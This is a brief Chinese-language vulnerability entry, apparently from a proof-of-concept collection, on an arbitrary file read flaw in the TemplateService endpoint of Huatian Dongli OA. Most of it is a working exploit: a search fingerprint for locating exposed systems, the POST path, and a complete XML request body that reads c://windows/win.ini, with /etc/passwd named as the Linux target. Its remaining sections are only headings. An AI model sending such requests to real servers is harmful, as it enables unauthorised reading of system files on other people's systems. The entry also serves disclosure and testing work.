# 华天动力OATemplateService存在任意文件读取漏洞

- **系统**：华天动力　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name="华天软件 OA"`
- **请求**：`POST /OAapp/bfapp/buffalo/TemplateService HTTP/1.1`

**请求体 / payload**
```
linux读取`/etc/passwd`,windows读取`c://windows/win.ini`
Host:
Content-Type: text/xml
<buffalo-call>
<method>getHtmlContent</method>
<string>c://windows/win.ini</string>
</buffalo-call>
```

**其他**
- 华天动力OA TemplateService存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 华天动力OA